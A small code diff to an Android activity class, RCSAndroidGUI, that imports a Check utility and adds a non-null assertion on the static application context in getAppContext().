@@ -1,5 +1,7 @@
 package com.ht.RCSAndroidGUI;
 
+import com.ht.RCSAndroidGUI.utils.Check;
+
 import android.app.Activity;
 import android.content.ComponentName;
 import android.content.Context;
@@ -16,6 +18,7 @@ public class RCSAndroidGUI extends Activity {
 	private static Context context;
 
 	public static Context getAppContext() {
+		Check.requires(context != null, "Null Context");
 		return context;
 	}
 	
